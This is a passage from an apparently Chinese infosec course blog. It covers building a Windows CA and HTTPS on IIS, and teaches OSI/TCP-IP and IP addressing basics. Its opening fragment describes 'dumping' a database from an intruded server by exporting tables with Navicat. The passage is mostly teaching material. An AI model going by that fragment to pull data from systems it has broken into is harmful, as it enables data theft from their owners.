data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625015964657-026e47d6-3cc9-47a7-9c0a-360657cfdd49.png" alt="img"></h3><h3 id="实验八脱裤与数据验证"><a class="markdownIt-Anchor" href="#实验八脱裤与数据验证">#</a> 实验八：脱裤与数据验证</h3><p>冷少遇到了一个问题，入侵了一台服务器但是想要把数据给脱下来，请问怎样实施 (手动狗头)</p><p>脱裤：使用 Navicat Premium 进行连接并对数据库中的数据库中的表进行导出得到 x.sql 数据文件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625044188866-b726414e-46a5-4e22-813f-c25a2bf2b9be.png" alt="img"></p><p>数据验证：等待素材</p><h1 id="二https服务"><a class="markdownIt-Anchor" href="#二https服务">#</a> 二：HTTPS 服务</h1><p>现在的互联网越来越重视网络安全方面的内容，像我们日常生活中浏览的网上银行网站等涉及安全的你都会发现有 https 的标志出现，在 URL 前加 https:// 前缀表明是用 SSL 加密的。 你的电脑与服务器之间收发的信息传输将更加安全。它实际上是对网站进行了加密保护。Web 服务器启用 SSL 需要获得一个服务器证书并将该证书与要使用 SSL 的服务器绑定。http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80, 后者是 443。HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比 http 协议安全.</p><ul><li>SSL（Security Socket Layer）全称是加密套接字协议层，它位于 HTTP 协议层和 TCP 协议层之间，用于建立用户与服务器之间的加密通信，确保所传递信息的安全性，同时 SSL 安全机制是依靠数字证书来实现的。</li><li>SSL 基于公用密钥和私人密钥，用户使用公用密钥来加密数据，但解密数据必须使用相应的私人密钥。使用 SSL 安全机制的通信过程如下：用户与 IIS 服务器建立连接后，服务器会把数字证书与公用密钥发送给用户，用户端生成会话密钥，并用公共密钥对会话密钥进行加密，然后传递给服务器，服务器端用私人密钥进行解密，这样，用户端和服务器端就建立了一条安全通道，只有 SSL 允许的用户才能与 IIS 服务器进行通信。</li></ul><p>提示：SSL 网站不同于一般的 Web 站点，它使用的是 “HTTPS” 协议，而不是普通的 “HTTP” 协议。因此它的 URL（统一资源定位器）格式为 “https：// 网站域名”。</p><h3 id="实验一ca证书服务搭建"><a class="markdownIt-Anchor" href="#实验一ca证书服务搭建">#</a> 实验一：CA 证书服务搭建</h3><table><thead><tr><th>服务器操作系统</th><th>角色服务</th><th>IP 地址</th></tr></thead><tbody><tr><td>Windows server 2012 r2</td><td>CA 证书服务器</td><td>192.168.0.</td></tr><tr><td>Windows server 2012 r2</td><td>WEB 服务器</td><td>192.168.0.</td></tr><tr><td>Windows 7</td><td>客户端验证</td><td>192.168.0.</td></tr></tbody></table><h4 id="准备一域服务搭建"><a class="markdownIt-Anchor" href="#准备一域服务搭建">#</a> 准备一：域服务搭建</h4><p>步骤一：搭建 CA 证书服务器，设置固定 IP 地址 (192.168.0.) 与主机名 (DC) 打开服务器管理器–&gt; 点击<strong>添加角色和功能</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121170850-d80c07c3-ae5c-4935-a148-95ea0e13e264.png" alt="img"></p><p>步骤二：一路回车到达选择服务器角色位置，选中<strong> Active Directory 域服务</strong>继续下一步并进行安装</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121331921-8e3cd691-76a8-4d47-83c3-ce2882a24194.png" alt="img"></p><p>步骤三：在服务器管理器小旗中选中将此服务器提升为域控制器–在开始界面选择创建新林为 laosec.cn 并依次往下配置</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121353804-979579f1-a5da-4b9d-9085-521379c11971.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121412068-b0647e7f-b789-4bff-8f0f-cd83a2cc9729.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121459146-cc34dd50-7680-436c-9ef3-a949647e76a2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121504394-93cb834c-b4d5-4722-bc84-9adea4a6cbad.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625121571022-3840b01a-8467-464e-9ed7-0c670135e8b4.png" alt="img"></p><p>安装完成后重启即可！！！</p><h4 id="准备二ca证书服务搭建"><a class="markdownIt-Anchor" href="#准备二ca证书服务搭建">#</a> 准备二：CA 证书服务搭建</h4><p>步骤一：打开服务器管理器点击–&gt; 添加角色和功能–&gt; 一路回车到选择服务器角色选择 Active Directory 证书服务并继续下一步</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625122661591-525b65aa-66b6-4c42-bc61-86734ccbc341.png" alt="img"></p><p>步骤二：在选择角色服务中勾选一下内容，一路回车安装即可。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625122712728-247a267f-af2a-46f3-a8d9-20bf43d1f3a4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625122780359-93de1572-654b-4518-8937-87827af660c8.png" alt="img"></p><p>步骤三：直接点击安装完成界面上的<strong>配置目标服务器上的 Active Directory 证书服务</strong>即可。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128511813-3ab62b7a-900a-4c27-9e72-103200855d69.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128650525-1bca3d18-3f01-408d-8a45-c4ec1dbfcfc5.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128677643-98bfa647-ed8a-4620-b2c4-a884a341c1cf.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128692281-bc4bcef2-95e1-446a-9b94-5b6012796e1c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128802175-43064bae-ab19-4496-a6a0-7346e5d5b940.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128814613-83ea50cd-ece1-4051-8a75-4d0ebb8983c7.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128825287-a89a7f99-2067-4e2c-ade0-f5775217c2b6.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128837899-11ea50dc-2815-4e21-8bb1-1b768acde4ce.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128975974-4c1d1e38-d597-45c6-8549-8804e7e6af88.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625128991571-02a55755-4c43-42d2-a28d-5debb7973f6b.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129019909-953e3c7e-0a31-442e-9bfd-dd99704458d8.png" alt="img"></p><p>步骤四：此时 CA 证书服务安装配置成功。从主界面右上角工具栏中打开证书颁发机构，可以看到里面存在证书模板这一项，表示配置成功</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129088259-1dae8fc4-0be2-4b15-b1e4-29dda8cc7841.png" alt="img"></p><h4 id="准备三在iis中添加签名证书"><a class="markdownIt-Anchor" href="#准备三在iis中添加签名证书">#</a> 准备三：在 IIS 中添加签名证书</h4><p>步骤一：在第二台 Windows server 2012R2 机器中打开 IIS 管理控制台，点进<strong>服务器证书</strong>页面</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129356637-0885717a-ddcc-4f72-835e-49a7812eaa2d.png" alt="img"></p><p>步骤二：点击创建证书申请–&gt; 在申请证书界面填写好相对应信息，下一步选择好位置创建 certsrv.txt 文件</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129431893-bea352ea-5b24-4aba-960e-401f9fad0bb6.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129525077-8a157462-7821-412e-a02c-e5fd39e9e9fc.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129649107-213c038a-040f-45c3-a050-27fac222feca.png" alt="img"></p><p>步骤三：打开 certsrv.txt 文档，并复制里面内容；访问 CA 证书服务器 <code>http://192.168.0.27/certsrv</code></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625129798358-f83e810a-1f32-4223-87d4-78c255b5ec96.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130029585-3b22160b-909d-4885-b1e3-cecea29ead47.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130073968-4fce462a-9617-4dad-be96-38ed0e58e432.png" alt="img"></p><p>步骤四：选择申请证书–&gt; 在选择高级证书申请–&gt; 在选择使用 base64 编码申请</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130213056-383f2d8c-92bf-4e74-ae59-4bd94c01c7cc.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130226190-3c44215c-a51f-4edc-a1b4-0d155092ff9e.png" alt="img"></p><p>步骤五：将之前文档中复制的所有内容粘贴到文本框中，证书模板选择 “WEB 服务器 “，并提交申请。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130433184-f771c2e3-c0a0-47cc-9932-9fc45fa55738.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130445666-e1e38d4f-f304-416d-9d47-5a8aae819c93.png" alt="img"></p><p>步骤六：先选择<strong>下载证书</strong>到本地，然后打开 IIS 管理器，完成证书申请</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130534795-612eb09c-7647-41f8-8584-14f8eb6777c2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130563994-ff3a0f26-5c90-4c7a-92f2-03f989f52af9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625130606311-e99dba2e-7642-4a9a-92fe-a5e752feafff.png" alt="img"></p><p>步骤六：在 IIS 里面通过对 https 进行设置 ssl 证书为新添加的证书</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625131262350-87e42f90-f419-415c-bd46-d5e82cdc809c.png" alt="img"></p><p>步骤七：在客户端浏览器中进行验证</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625131420377-f0f52166-a08d-45e8-b982-72260e090afb.png" alt="img"></p><h4 id="准备四证书导入"><a class="markdownIt-Anchor" href="#准备四证书导入">#</a> 准备四：证书导入</h4><p>步骤一：访问 <code>http://192.168.0.19/cersrv</code>  下载 CA 证书并保存到本地磁盘</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625131645582-b2b0aedf-162d-44b3-b65f-9440b99df4e7.png" alt="img"></p><p>步骤二：cmd–&gt;mmc–&gt; 添加证书–&gt; 收信任的根证书颁发机构下–&gt; 证书–&gt; 任务右键导入–&gt; 成功–&gt; 浏览器重新访问</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132113754-14b7871f-4009-4a0b-ba2d-9fdf14a201c2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132176108-eaaf9392-fdd6-4618-8d71-a095b50b7cc1.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132257502-dd094c66-7c22-41d9-93ee-04693c3cb525.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132267023-9f998719-696d-4675-91e5-cce2b429fe72.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132287248-55470346-6abe-485b-936d-54860b0ce1d5.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132463069-403e5c12-5b9d-4445-81d9-26ba0d96cb4b.png" alt="img"></p><h3 id="实验二只允许https访问"><a class="markdownIt-Anchor" href="#实验二只允许https访问">#</a> 实验二：只允许 HTTPS 访问</h3><p>步骤一：在 IIS 控制台中点击对应网站在主页点进 SSL 中–&gt; 勾选要求 SSL–&gt; 应用即可–&gt; 客户端浏览器测试访问</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132486681-6035cb81-0cf4-437f-9445-8785cffef6e6.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132709148-3509b62f-1bee-4ca4-ab9d-508966e7f2ab.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1625132773268-7fdab467-e527-44c6-b708-75383ed86247.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一天webca证书&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第一天webca证书&quot;&gt;#&lt;/a&gt; 第一天：WEB/CA 证书&lt;/h1&gt;
&lt;h1 id=&quot;一http服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.2%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.2%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</id>
    <published>2022-01-19T10:10:47.528Z</published>
    <updated>2022-03-03T01:27:33.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天计算机网络"><a class="markdownIt-Anchor" href="#第二天计算机网络">#</a> 第二天：计算机网络</h1><p>》》》昨日复习《《《</p><p>》》》课前实验《《《</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.yuque.com/docs/share/8e0c043d-12bc-4ed9-b6e3-869597527c9f?<span class="comment">#（密码：tc8g） 《CNVD-2021-17369：锐捷Smartweb管理系统 密码信息泄露漏洞》</span></span><br><span class="line">https://www.yuque.com/docs/share/e860a614-90b9-40ca-<span class="number">8132</span>-dda9464ba5e6?<span class="comment">#（密码：oxxh） 《CVE-2021-37580：Apache ShenYu JWT认证缺陷漏洞》</span></span><br></pre></td></tr></table></figure><p>熟知计算机网络的构造，才能为以后的流量分析即溯源，打下坚实的基础。</p><h1 id="一osi七层参考模型"><a class="markdownIt-Anchor" href="#一osi七层参考模型">#</a> 一：OSI 七层参考模型</h1><p>计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。</p><p><strong>》》》计算机网络的分类《《《</strong></p><table><thead><tr><th>依照</th><th>分类类型</th></tr></thead><tbody><tr><td>地理范围</td><td>局域网 (LAN)/ 城域网 (MAN)/ 广域网 (WAN)</td></tr><tr><td>交换方式</td><td>线路交换网络 / 报文交换网络 / 分组交换网络</td></tr><tr><td>拓扑结构</td><td>树形网络 / 总线型网络 / 环形网络 / 网状网络</td></tr></tbody></table><ul><li><p><strong>局域网</strong>：是指范围在几百米到十几公里内办公楼群或校园内的计算机相互连接所构成的计算机网络。计算机局域网被广泛应用于连接校园、工厂以及机关的个人计算机或工作站，以利于个人计算机或工作站之间共享资源（如打印机）和数据通信。</p></li><li><p><strong>城域网</strong>：所采用的技术基本上与局域网相类似，只是规模上要大一些。城域网既可以覆盖相距不远的几栋办公楼，也可以覆盖一个城市；既可以是私人网，也可以是公用网。</p></li><li><p><strong>广域网</strong>：通常跨接很大的物理范围，如一个国家。</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641813403231-9375dea7-5391-444b-a7c8-5e584ec4f9e4.png" alt="img"></p><p><strong>》〉》通信要素《〈《</strong></p><p>在网络上只要利用 IP 地址就可以找到目标主机，因此要攻击某个网络主机就要应该先确定该目标主机的域名或 IP 地址。</p><p>阐述：</p><p>所谓的 ip 地址就是一种主机编址方式，给每个连接在 Intelnet 上的主机分配一个 32bit 的地址，也称为网际协议地址。按照 TCP/IP（Transport Control Protocol/Intelnet Protocol，传输控制协议）协议簇的规定，IP 地址用二进制来表示，每个 IP 地址长 32bit，换算成字节就是 4 字节（Byte）。例如，一个采用二进制形式的 ip 地址是 “000010100000000000000000001”，这么长的地址处理起来很费劲，为了方便使用，IP 地址经常被写成十进制的形式，中间使用 &quot;.&quot; 分割不同的字节，即用 XXX.XXX.XXX.XXX 的形式来表现，每组 XXX 代表小于等于 255 的十进制数，例如 192.168.38.6。IP 地址的这种表示方法称为 “点分十进制表示法”，这显然比二进制的 1 和 0 容易记忆多了</p><p>一个完整的 IP 地址信息应该包括：IP 地址 / 子网掩码 / 默认网关 / 和 DNS… 只有四个协同工作时，用户才可以访问 Internet 并被 Internet 的计算机所访问…</p><p>（采用静态 IP 地址接入 Internet 时候，ISP 应当为用户提供全部 IP 地址信息）</p><ul><li>IP 地址：企业网络使用的合法 IP 地址，由提供 Internet 接入的服务商（ISP）分配公网地址，公网地址可以由网络管理员自由分配。但网络内部的私有 IP 地址不能相同，否则会发生 IP 地址冲突，导致网络连接失败。一般情况，IP 地址可以分为 5 大类别：A 类 / B 类 / C 类 / D 类及 E 类。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">A类地址以<span class="number">0</span>开头，第一个字节作为网络号，地址范围为：<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span>；   </span><br><span class="line">B类地址以<span class="number">10</span>开头，前两个字节作为网络号，地址范围是：<span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>;</span><br><span class="line">C类地址以<span class="number">110</span>开头，前三个字节作为网络号，地址范围是：<span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>；</span><br><span class="line">D类地址以<span class="number">1110</span>开头，地址范围是<span class="number">224.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">239.255</span><span class="number">.255</span><span class="number">.255</span>，D类地址作为组播地址（一对多的通信）；</span><br><span class="line">E类地址以<span class="number">1111</span>开头，地址范围是<span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>，E类地址为保留地址，供以后使用。</span><br><span class="line">注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</span><br><span class="line"><span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。</span><br><span class="line">例如：主机<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/<span class="number">30</span>上的直接广播数据包后，另外一个网段<span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>/<span class="number">30</span>也能收到该数据报；若发送受限广播数据报，则不能收到。</span><br><span class="line">注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>   </span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>~<span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>。</span><br><span class="line">A、B、C类私有地址</span><br><span class="line">私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。</span><br><span class="line">A类私有地址：<span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>，范围是：<span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">10.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">B类私有地址：<span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>，范围是：<span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">C类私有地址：<span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span>，范围是：<span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">192.168</span><span class="number">.255</span><span class="number">.255</span></span><br></pre></td></tr></table></figure><ul><li>子网掩码：子网掩码是于 IP 地址结合使用的一种技术，其主要作用有两个：</li></ul><ol><li><p>用于确定地址中的网络号和主机号</p><p>2. 用于将一个大的 IP 网络划分为若干个小自网络（划分子网）</p></li></ol><p>什么是子网掩码？</p><p>子网掩码是标志两个 IP 地址是否同属于一个子网的，也是 32 位二进制地址，其每一个为 1 代表该位是网络位，为 0 代表主机位。它和 IP 地址一样也是使用点式十进制来表示的。如果两个 IP 地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A类地址来说，默认的子网掩码是<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>；</span><br><span class="line">对于B类地址来说默认的子网掩码是<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>；</span><br><span class="line">对于C类地址来说默认的子网掩码是<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><ul><li>默认网关：当一台主机找不到可用的网关时，就把数据包发送给指定的默认网关，由这个网关来处理数据包。</li></ul><p>（从一个网络向另一个网络发送消息，也必须经过一道 “关口” 这道关口就是网关）</p><ul><li>DNS 地址：DNS 服务用于将用户的域名请求转换为 IP 地址。如果企业网络没有提供 DNS 服务，则 DNS 服务器的 IP 地址应当是 ISP 的 DNS 服务器。</li></ul><p><strong>》》》OSI 七层参考模型《《《</strong></p><p>有了计算机等设备，也就得考虑如何连接起来他们，这就是他们之间该如何通信的问题。对计算机来说，就是一个硬件设备，如何让计算机与计算机连接起来，必需需要软件的支撑。那么支持计算机通讯的软件是什么呢？就是计算机网络参考模型。这个计算机网络参考模型就是计算机网络软件。最经典的当然是国际化标准的 OSI（Open System InterConnect  开放式系统互联）参考模型。它是通过一个机器上的一个应用进程与另一个机器上的进程进行信息交互。</p><p>OSI 七层模型概念：</p><p>1：OSI (open system Interconnect), 即开放式系统互联。一般叫 OSI 参考模型，是 ISO (国际标准化组织) 组织在 1985 年研究的网络互联模型。</p><p>2：ISO 为了更好的使网络应用更为普及，推出了 OSI 参考模型。其含义就是推荐所有公司使用这个规范来控制网络。这样所有公司都有相同的规范，就能产生互联。</p><p>3：OSI 定义了网络互联的七层框架（物理层、数据链层、网络层、传输层、会话层、表示层、应用层），即 ISO 开放互连系统参考模型。</p><p>4：每一层实现各自的功能和协议，并完成与相邻层的接口通信。OSI 的服务定义详细说明了各层所提供的服务。某一层的服务就是该层及其下各层的一种功能，它同通过接口提供更高一层。各层所提供的服务与这些服务是怎末实现无关。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623377768783-e019cdb1-bd06-4830-b55b-29feed6e84f7.png" alt="img"></p><p><strong>》》》OSI 七层作用介绍《《《</strong></p><p>1：应用层</p><p>应用层是 OSI 参考模型的最高层，是用户与网络的接口。该层通过应用程序来完成网络用户的应用需求，如文件传输、收发电子邮件等。</p><p>【提供与用户的接口，最终呈现给用户】</p><p>2：表示层</p><p>表示层处理流经结点的数据编码的表示方式问题，以保证一个系统应用层发出的信息可被另一系统的应用层读出。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据表示格式转换成网络通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>【数据的表示 / 安全 / 压缩】</p><p>3：会话层</p><p>会话层主要功能是管理和协调不同主机上各种进程之间的通信（会话），即负责建立、管理和终止应用程序之间的会话。会话层得名的原因是它很类似于两个实体间的会话概念。例如，一个交互的用户会话以登录到计算机开始，以注销结束。</p><p>【建立用户之间的会话关系】</p><p>4：传输层</p><p>传输层的作用是为上层协议提供端到端的可靠的、透明的数据传输服务，包括处理差错控制和流量控制等问题。该层向高层屏蔽了下层数据通信的细节，使高层用户看到的只是在两个传输实体间的一条主机到主机的、可由用户控制和设定的、可靠的数据通路。</p><p>传输层传送的协议数据单元称为段（data segment）或报文（Message）。</p><p>【定义传输数据的协议端口号以及流控和差错校验】</p><p>5：网络层：</p><p>网络层是为其上层传输层提供服务，传送的协议数据单元称为数据包 (Packet) 或分组。该层的主要作用是解决如何使数据包通过各结点传送的问题，即通过路径选择算法（路由）将数据包送到目的地。另外，为避免通信子网中出现过多的数据包而造成的网络阻塞，需要对流入的数据包数量进行控制（拥塞控制）。当数据包要跨越多个通信子网才能到达目的地时，还要解决网际互连的问题。</p><p>类比：网络层相当于邮局中的信件分拣人员。</p><p>网络层的作用：</p><ul><li><p>路由选路</p></li><li><p>拥塞控制、差错检测与恢复</p></li><li><p>网络互联</p></li></ul><p>【进行逻辑地址寻址，实现不同网络之间的路径选择】</p><p>6：数据链层</p><p>数据链路层是为其上层网络层提供服务，解决两个相邻结点之间的通信问题，传送的协议数据单元称为数据帧 (Data frame)。</p><p>数据帧中包含物理地址（又称 MAC 地址）、控制码、数据及校验码等信息。该层的主要作用是通过校验、确认和反馈重发等手段，将不可靠的物理链路转换成对网络层来说无差错的数据链路。</p><p>此外，数据链路层还要协调收发双方的数据传输速率，即进行流量控制，以防止接收方因来不及处理发送方来的高速数据而导致缓冲器溢出及线路阻塞。</p><p>类比：数据链路层相当于邮局中的装拆箱人员。</p><p>数据链层的作用：</p><ul><li><p>物理地址定义 网络拓扑机构</p></li><li><p>链路参数差错验证</p></li><li><p>物理介质访问流控制</p></li></ul><p>【进行逻辑链接 / 进行硬件地址寻址 / 差错校验等功能】</p><p>7：物理层</p><p>物理层是 OSI 参考模型的最底层，它利用传输介质为其上层数据链路层提供物理连接。它主要关心的是通过物理链路从一个节点向另一个节点传送比特流（bit），物理链路可能是铜缆、光纤、无线或其他的通讯媒介。它关心的问题有：多少伏电压代表 1？多少伏电压代表 0？时钟速率是多少？采用全双工、半双工还是单工通信？</p><p>总的来说物理层关心的是链路的机械、电气、功能和规程特性。</p><p>类比：物理层相当于邮局中的搬运工人。Physical Layer</p><p>物理层的作用：</p><ul><li>提供传输数据的物理通路，传输数据</li></ul><p>​    【建立 / 维护 / 断开物理层链接】</p><p>记忆口诀：应表会传网数物</p><h1 id="二tcpip五层模型"><a class="markdownIt-Anchor" href="#二tcpip五层模型">#</a> 二：TCP/IP 五层模型</h1><p>由于 ISO 指定的 OSI 参考模型过于庞大、复杂、在实现制作过程造成了很多困难，从而招致了很多批评。在现实中，TCP/IP 协议获得了广泛的应用。目前主流的操作系统网络协议基本上都采用了 TCP/IP 协议。而 TCP/IP 与 OSI 在分层模型上稍有区别：OSI 参考模型注重 &quot;通信协议必要的功能是什么&quot;，而 TCP/IP 则更强调 &quot;在计算机上实现协议应该开发那种程序&quot;。</p><ul><li><p>另外一个著名的模型是 TCP/IP 模型，TCP/IP 是传输控制协议 / 网络互联协议的简称；</p></li><li><p>早期的 TCP/IP 协议是一个四层结构，在后来的使用过程中借鉴 OSI 的七层参考模型，形成了一个新的五层结构；</p></li><li><p>TCP/IP 是一系列协议的集合，所以严格的称呼应该是 TCP/IP 协议簇；</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641816411268-9a24cead-13c8-460b-944a-6a38660bc7c3.png" alt="img"></p><p><strong>》》》TCP/IP 五层与 OSI 七层的区别《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2336202/1641210571031-56562245-f047-4fcb-a39e-ad0d6c01d825.png" alt="img"></p><p>1：开放式系统互联模型是一个参考标准，解释协议相互之间应该如何相互作用。TCP/IP 协议是美国国防部发明的，是让互联网成为了目前这个样子的标准之一。</p><p>2：开放式系统互联模型中没有清楚地描绘 TCP/IP 协议，但是在解释 TCP/IP 协议很容易想到开放式系统互联模型。两者的主要区别如下：TCP/IP 协议中的应用层处理开放式系统互联模型中的第五层、第六层和第七层的功能。TCP/IP 协议中的传输层并不能总是保证在传输层可靠地传输数据包，而开放式系统互联模型可以做到。TCP/IP 协议还提供一项名为 UDP（用户数据报协议）的选择。UDP 不能保证可靠的数据包传输。</p><p><strong>》》》模型对应的协议《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641816722890-fe61567a-f1fb-4fb9-b4df-d4753fab38fd.png" 